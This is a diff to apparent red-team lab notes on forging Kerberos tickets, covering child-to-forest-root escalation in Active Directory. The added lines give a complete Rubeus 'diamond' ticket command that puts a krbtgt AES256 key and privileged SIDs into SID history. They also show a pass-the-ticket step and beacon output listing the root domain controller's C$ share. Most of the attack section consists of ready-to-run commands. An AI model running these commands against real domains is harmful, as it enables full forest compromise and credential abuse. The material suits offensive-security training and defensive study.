@@ -30,7 +30,7 @@ Where:
     
 - `/sid` is the SID of the child domain.
     
-- `/sids` is a list of SIDs you want in the ticket's SID history.
+- `/sids` is a list of SIDs you want in the ticket's SID history. **(519 = EA)**
 
 
 > [!NOTE] Note
@@ -46,3 +46,46 @@ Where:
 > --------------------
 objectSid: S-1-5-21-3926355307-1661546229-813047887
 
+Or it can be created using the diamond technique:
+
+```powershell
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
+```
+
+Where:
+
+- `/tgtdeleg` gets a usable TGT for the current user.
+    
+- `/ticketuser` is the user you want to impersonate.
+    
+- `/ticketuserid` is the RID of the impersonated user.
+    
+- `/sids` is a list of SIDs you want in the ticket's SID history.
+    
+- `/krbkey` is the AES256 hash of the child domain's krbtgt account.
+
+Once the ticket is injected into a logon session, it can be used to access the forest root domain controller.
+
+```powershell
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:
+```
+
+```powershell
+beacon> ls \\lon-dc-1\c$
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     01/24/2025 13:33:39   $Recycle.Bin
+          dir     01/23/2025 13:57:51   $WinREAgent
+          dir     01/23/2025 13:47:37   Documents and Settings
+          dir     05/08/2021 09:20:24   PerfLogs
+          dir     01/23/2025 15:46:17   Program Files
+          dir     01/23/2025 15:46:18   Program Files (x86)
+          dir     03/03/2025 13:38:06   ProgramData
+          dir     01/23/2025 13:47:43   Recovery
+          dir     01/29/2025 10:42:20   System Volume Information
+          dir     01/24/2025 13:33:21   Users
+          dir     01/24/2025 13:49:56   Windows
+ 12kb     fil     03/13/2025 05:44:35   DumpStack.log.tmp
+ 1gb      fil     03/13/2025 05:44:35   pagefile.sys
+```
